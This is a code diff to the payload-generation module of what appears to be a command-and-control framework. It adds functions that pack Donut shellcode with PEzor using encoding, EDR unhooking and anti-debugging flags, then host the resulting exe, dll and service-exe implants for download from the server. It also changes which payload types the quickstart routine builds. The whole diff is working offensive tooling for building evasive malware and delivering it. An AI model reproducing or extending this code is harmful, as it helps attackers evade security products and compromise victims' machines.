@@ -777,6 +777,72 @@ class Payloads(object):
         self.QuickstartLog(f"hosted at {self.FirstURL}/{self.QuickCommand}{name}pinvoke")
         self.QuickstartLog(f"base64 hosted at {self.FirstURL}/{self.QuickCommand}{name}pinvoke_b64")
 
+    def CreatePezorsFromShellcode(self,shellcodePath,arch,name=""):
+        self.QuickstartLog(Colours.END)
+        self.QuickstartLog("PEzor payload files:")
+        self.CreatePEzor(name,
+                         shellcodePath=shellcodePath,
+                         format="exe",
+                         arch=arch)
+
+        self.CreatePEzor(name,
+                         shellcodePath=shellcodePath,
+                         format="dll",
+                         arch=arch)
+
+        self.CreatePEzor(name,
+                         shellcodePath=shellcodePath,
+                         format="service-exe",
+                         arch=arch)
+
+    def CreatePEzors(self,name):
+        self.QuickstartLog(Colours.END)
+        self.QuickstartLog("PEzor payload files:")
+        self.CreatePEzor(name,
+                         shellcodePath=f"{self.BaseDirectory}{name}{PayloadType.Sharp.value}_Donut_x64_Shellcode.bin",
+                         format="exe",
+                         arch="64")
+        self.CreatePEzor(name,
+                         shellcodePath=f"{self.BaseDirectory}{name}{PayloadType.Sharp.value}_Donut_x86_Shellcode.bin",
+                         format="exe",
+                         arch="86")
+
+        self.CreatePEzor(name,
+                         shellcodePath=f"{self.BaseDirectory}{name}{PayloadType.Sharp.value}_Donut_x64_Shellcode.bin",
+                         format="dll",
+                         arch="64")
+        self.CreatePEzor(name,
+                         shellcodePath=f"{self.BaseDirectory}{name}{PayloadType.Sharp.value}_Donut_x86_Shellcode.bin",
+                         format="dll",
+                         arch="86")
+
+        self.CreatePEzor(name,
+                         shellcodePath=f"{self.BaseDirectory}{name}{PayloadType.Sharp.value}_Donut_x64_Shellcode.bin",
+                         format="service-exe",
+                         arch="64")
+        self.CreatePEzor(name,
+                         shellcodePath=f"{self.BaseDirectory}{name}{PayloadType.Sharp.value}_Donut_x86_Shellcode.bin",
+                         format="service-exe",
+                         arch="86")
+
+    def CreatePEzor(self,name,shellcodePath,format,arch):
+        arch = arch.replace("x","")
+        out = subprocess.check_output(
+            f"{PayloadTemplatesDirectory}../PEzor/PEzor.sh -shellcode -{arch} -sgn -unhook -antidebug -format={format} {shellcodePath}",
+            shell=True,stderr=subprocess.DEVNULL)
+
+        packed = re.findall(r"Check (/.*packed.*[exe|dll]):",out.decode())[0]
+        insert_hosted_file("%s%spezor_%sx%s_b64" % (self.QuickCommand, name,format,arch),
+                           packed,
+                           "text/html", "Yes", "Yes")
+        insert_hosted_file("%s%spezor_%sx%s" % (self.QuickCommand, name,format,arch),
+                           packed,
+                           "application/octet-stream", "No", "Yes")
+
+        self.QuickstartLog(f"{format} available here: {shellcodePath}.packed.{format.replace('-','.')}")
+        self.QuickstartLog(f"hosted at {self.FirstURL}/{self.QuickCommand}{name}pezor_{format}x{arch}")
+        self.QuickstartLog(f"base64 hosted at {self.FirstURL}/{self.QuickCommand}{name}pezor_{format}x{arch}_base64")
+
     def CreatePMsbuild(self,shellcodePath,arch,name=""):
         self.QuickstartLog(Colours.END)
         self.QuickstartLog("PMsbuild payload files:")
@@ -979,14 +1045,14 @@ class Payloads(object):
         self.QuickstartLog(Colours.END + "==================================" + Colours.END)
         self.CreateDroppers(name)
         self.CreatePS(name)
-        self.CreateDlls(name)
+        #self.CreateDlls(name)
         self.CreateShellcode(name)
+        self.CreateDonutShellcode(name)
         self.CreatePSInjectors(name)
         self.CreateDotNet2JS(name)
-        self.CreateEXE(name)
-        self.CreateMsbuild(name)
-        self.CreateCsc(name)
-        self.CreateDonutShellcode(name)
+        #self.CreateEXE(name)
+        #self.CreateMsbuild(name)
+        #self.CreateCsc(name)
         self.CreateJXA(name)
         self.CreatePython(name)
         self.CreateDynamicCodeTemplate(name)
